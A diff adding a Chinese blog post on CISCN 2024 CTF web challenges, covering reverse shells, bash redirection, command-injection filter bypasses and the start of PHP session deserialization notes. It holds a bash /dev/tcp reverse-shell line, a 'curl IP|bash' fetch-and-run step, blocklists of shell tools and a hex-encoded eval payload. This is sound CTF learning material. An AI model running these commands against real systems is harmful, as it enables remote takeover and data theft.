@@ -1,0 +1,548 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ciscn2024的一些反思 | Gu0f3n'blog</title><meta name="author" content="Gu0f3n"><meta name="copyright" content="Gu0f3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="什么是反弹shellreverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2024的一些反思">
+<meta property="og:url" content="https://gu0f3n.github.io/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/index.html">
+<meta property="og:site_name" content="Gu0f3n&#39;blog">
+<meta property="og:description" content="什么是反弹shellreverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg">
+<meta property="article:published_time" content="2024-07-18T08:45:41.000Z">
+<meta property="article:modified_time" content="2024-07-18T08:51:28.457Z">
+<meta property="article:author" content="Gu0f3n">
+<meta property="article:tag" content="ciscn2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gu0f3n.github.io/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ciscn2024的一些反思',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-18 16:51:28'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Gu0f3n'blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Gu0f3n'blog"><span class="site-name">Gu0f3n'blog</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ciscn2024的一些反思</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-18T08:45:41.000Z" title="发表于 2024-07-18 16:45:41">2024-07-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-18T08:51:28.457Z" title="更新于 2024-07-18 16:51:28">2024-07-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ciscn2024的一些反思"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h3><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<span id="more"></span><!-- more --><!-- more -->
+
+<p>正向连接</p>
+<p>就是我们客户端连服务器</p>
+<p>我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接</p>
+<p>反向连接</p>
+<p>就是让服务器连我们</p>
+<p>一般适用于</p>
+<ul>
+<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
+<li>目标机端口被占用。</li>
+<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的</li>
+<li>向web里面的话有可能出现在rce当中过滤的函数实在太多，我们只能去实现反向连shell</li>
+</ul>
+<h3 id="常见的方式"><a href="#常见的方式" class="headerlink" title="常见的方式"></a><strong>常见的方式</strong></h3><ul>
+<li><p>Bash反弹shell</p>
+</li>
+<li><p>首先我们先了解下Linux的连接符号和重定向</p>
+</li>
+<li><p><strong>什么是重定向：</strong></p>
+</li>
+<li><p>Linux中的重定向就是<strong>将原本要输出到屏幕中的数据信息,重新指向某个特定文件当中</strong>，或者定向到黑洞文件（&#x2F;dev&#x2F;null）中。</p>
+</li>
+<li><p><strong>重定向的作用:</strong></p>
+<ul>
+<li><p>当屏幕输出的信息很重要,希望保存时</p>
+</li>
+<li><p>后台执行的程序一般都会有输出，不希望它输出干扰到终端</p>
+</li>
+<li><p>执行定时备份任务，希望将备份结果保留下来时</p>
+</li>
+<li><p>执行一些命令,会提示一些报错信息,可以直接将报错丢弃。</p>
+</li>
+<li><p>执行命令时希望将报错和正确内容区分在不同文件中时（日志）</p>
+</li>
+<li><ol>
+<li><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2></li>
+</ol>
+</li>
+<li><blockquote>
+<ol>
+<li>文件描述符是IO重定向中的重要概念。文件描述符使用数字表示，它指明了数据的流向特征。</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>在Linux中我们分别使用描述符0，1，2表示</p>
+<p>这三个默认的符号文件分别是终端字符设备的软连接&#x2F;dev&#x2F;stdin、&#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;srderr</p>
+<p>表示标准输入、标准输出、和报错</p>
+<p>当进程操作一个文件时：</p>
+<p>首先程序是无法直接访问硬件，需要借助内核来访问文件</p>
+<p>而内核kernel需要利用文件描述（file descriptor）来访问</p>
+<p>总结：进程使用文件描述符来管理打开的文件对应关系</p>
+<p><strong>通常程序访问一个文件至少会打开三个标准文件，分别是标准输入，<strong><strong>标准输出</strong></strong>，错误输出</strong></p>
+<p><strong>进程将从标准输入中的到数据，将正常输出打印至屏幕终端，将错误的输出信息也打印至屏幕终端</strong></p>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>我们使用&gt;或者&gt;&gt;时符号<strong>左边</strong>表示文件描述符，没有的话默认<strong>是1</strong>（标准输出）符号右边可以是文件也可以是输出设备（linux中万物都是文件，且设备也是文件）<strong>当使用&gt;时，会判断右边的文件存不存在，如果存在的话就先删除，然后创建一个新的文件，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件</strong></p>
+<p>简单用法就不举例子了</p>
+<p>高级用法：</p>
+<p>#将错误输出信息关闭掉，控制台只打印了标准输出</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;&amp;-</span><br></pre></td></tr></table></figure>
+
+<p>this is a.txt</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>this is a.txt</p>
+<p>#&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
+<p>#&#x2F;dev&#x2F;null 这个设备，是linux 中黑洞设备，什么信息只要输出给这个设备，都会给吃掉</p>
+<p>#关闭所有输出</p>
+<p>#关闭 1 ，2 文件描述符</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 1&gt;&amp;- 2&gt;&amp;-</span><br></pre></td></tr></table></figure>
+
+<p>#将1,2 输出转发给&#x2F;dev&#x2F;null设备</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[chengmo@centos5 shell]$ ls test.sh test1.sh  2&gt;/dev/null 1&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>#将标准输出fd&#x3D;1重定向到&#x2F;dev&#x2F;null文件，然后将fd&#x3D;2重定向到fd&#x3D;1所绑定的&#x2F;dev&#x2F;null文件。这种常用文件描述符前必须有个 &amp;, 否则2&gt;1就变成将错误输出输出到一个名为1的文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]<span class="built_in">cat</span> 1.txt 2.txt &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>#&amp;&gt;代表将标准输出与标准错误重定向到&#x2F;dev&#x2F;null文件</p>
+<h3 id="输入重定向实例"><a href="#输入重定向实例" class="headerlink" title="输入重定向实例"></a><strong>输入重定向实例</strong></h3><p>我们使用<code>&lt;</code>对输入做重定向，<strong>如果符号左边没有写值，那么默认就是0。</strong> <strong>格式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command-line [n] &lt;文件</span><br></pre></td></tr></table></figure>
+
+<p>命令默认从键盘获得的输入，使用输入重定向改成从文件，或者其它打开文件以及设备输入。执行这个命令，将标准输入0，与文件或设备绑定，将由它进行输入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat &gt; stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">[root@sccprocddev02:/home/upro01]cat stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br></pre></td></tr></table></figure>
+
+<p>#这里使用ctrl+d 或者ctrl+c退出输入</p>
+<p>#从标准输入[键盘]获得数据，然后输出给stdout.txt文件</p>
+<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout2.txt &lt; stdout.txt</p>
+<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat stdout2.txt</p>
+<p>this is stdout.txt</p>
+<p>#从stdout.txt获得输入数据，然后输出给文件stdout2.txt</p>
+<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout3.txt &lt;&lt; end</p>
+<blockquote>
+<p>first line</p>
+<p>second line</p>
+<p>end</p>
+<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]#cat stdout3.txt</p>
+<p>first line</p>
+<p>second line</p>
+<p>#&lt;&lt; 这个连续两个小符号， 他代表的是[结束的输入字符]的意思。这样当空行输入end字符时，自动退出输入，不需要使用ctrl+d或者ctrl+c退出</p>
+</blockquote>
+<p>先简单了解下这两个</p>
+<p>回到Bash反弹shell</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.<span class="number">72/2333</span> <span class="number">0</span>&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    #更稳定</p>
+<p>#bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1</p>
+<p>&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
+<p>所以这段指令就是在目标及和主机之间进行一个bash的shell交互环境，在主机上从键盘输出到0（也就是输出到目标机上比如我们执行指令），目标机进行输出（收到主机的指令，进行输出到主机上面）从而形成回路</p>
+<p>然后攻击机在本地监听就可以了</p>
+<p>nc -lvvn 2333</p>
+<p>Curl配合Bash反弹shell首先，在攻击者vps的web目录里面<strong>创建一个index文件</strong>（index.php或index.html），内容如下</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p>
+<p>#使用 bash -i 命令启动一个交互式的 Bash shell。然后将 shell 的标准输入、标准输出和标准错误重定向到 TCP 连接上,连接到 IP 地址 47.xxx.xxx.72 的 2333 端口</p>
+<p>并开启2333端口的监听然后再目标机上执行如下，即可反弹shell：</p>
+<p>curl 47.xxx.xxx.72|bash</p>
+<p>#使用curl指令从 IP 地址 47.xxx.xxx.72 下载一个文件或脚本。然后将下载的内容通过管道符 | 传递给 bash 命令,也就是执行这个下载的脚本。</p>
+<p><code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
+<p>基本了解了bash的反弹shell之后我们找题目</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;  <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  &#125;  <span class="keyword">else</span>&#123;     <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这个题目的关键函数</p>
+<p><strong>strCheck()函数</strong>是用来检查输入的命令是否包含一些危险的关键字,比如;、&amp;、$等。如果包含这些关键字,函数会直接退出并输出”i hate this”。</p>
+<p>cmd进行传参传给strCheck()</p>
+<p><strong>如果strCheck()函数没有拦截该命令,代码会使用</strong></p>
+<p><strong>shell_exec()函数执行该命令</strong></p>
+<p>shell_exec()是PHP中用于执行系统命令的一个函数。它的作用是执行一个外部程序或命令,并将该命令的输出以字符串的形式返回。</p>
+<p>用了shell_exec函数执行命令，但是不能回显，这里可以用重定向将命令写入到指定的文件</p>
+<p>利用重定向执行ls &#x2F; 输出到1.txt</p>
+<p>进入1.txt</p>
+<p>执行同样操作</p>
+<p>看到flag，下面将flag进行输出</p>
+<p>再次访问1.txt得到flag</p>
+<h2 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024 simple_php"></a><strong>CISCN2024 simple_php</strong></h2><p>今年国赛的一道题目</p>
+<p>属实让我一脸懵逼        </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$cmd</span> = escapeshellcmd<span class="variable">$$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>,<span class="variable">$cmd</span>)) </span><br><span class="line"></span><br><span class="line">&#123;     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很多函数我都没见过，还过滤这么多东西</p>
+<p>坐牢一下午</p>
+<p>函数就不进行解释了</p>
+<p>发现可以通过换行符进行了绕过</p>
+<p>看了一些wp，这些人是这么想到的？他们竟然能用rce来做这题</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>
+
+<p>php -r这真让人难以想到</p>
+<p>找到flag就可以了</p>
+<p>文章：<a target="_blank" rel="noopener" href="https://xia0ji233.pro/2024/05/19/CISCN2024/index.html">https://xia0ji233.pro/2024/05/19/CISCN2024/index.html</a></p>
+<p>还有一种就是反弹shell了</p>
+<p>以为可以%0a换行符号绕过</p>
+<p>在复现之前我得先搭建个服务器给自己</p>
+<p>所以这几天我看能不能搭建自己的服务器</p>
+<h1 id="PHP的session反序列化漏洞"><a href="#PHP的session反序列化漏洞" class="headerlink" title="PHP的session反序列化漏洞"></a><strong>PHP的session反序列化漏洞</strong></h1><p>反序列化还是有一点点的基础，现在的想法就是边做题边看wp边学习做笔记，先学广在慢慢学精</p>
+<p>SESSION先了解下</p>
+<p><strong>PHP Session 概述</strong></p>
+<p>session 是一种客户与网站（服务器）更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用（保持）这个会话，从而让访问者与网站之间建立了一种“对话”机制。</p>
+<p>这是官方的解释</p>
+<p>session 会话会为每一个开启了 session 会话的访问者建立一个唯一的会话 ID ，用于识别用户。该会话 ID 可能存储于用户电脑的 cookie 内，也可能通过 URL 来传递。而对应的具体 session 值会存储于服务器端，这也是与 cookie 的主要区别，并且安全性相对较高。</p>
+<p>回到session的反序列化</p>
+<p>在php.ini中存在三项配置项：</p>
+<ul>
+<li><code>session.save_path=&quot;&quot;</code>  –设置session的存储路径</li>
+<li><code>session.save_handler=&quot;&quot;</code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
+<li><code>session.auto_start  boolen</code> –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</li>
+<li><code>session.serialize_handler  string</code>–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</li>
+</ul>
+<p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。</p>
+<p>举例：</p>
+<ul>
+<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
+<li><code>session.save_handler=files</code>   表明session是以文件的方式来进行存储的</li>
+<li><code>session.auto_start=0</code>  表明默认不启动session</li>
+<li><code>session.serialize_handler=php</code>   表明session的默认序列话引擎使用的是php序列话引擎</li>
+</ul>
+<ol>
+<li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li>
+<li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li>
+<li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li>
+</ol>
+<p><strong>存储机制</strong></p>
+<p>php中的session中的内<strong>容并不是放在内存</strong>中**的，而是以*文件******的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
+<p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
+<p>假设我们的环境是xampp，那么默认配置如上所述。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在php_serialzie引擎下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code> 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
+<p><strong>在php_binary引擎下：</strong></p>
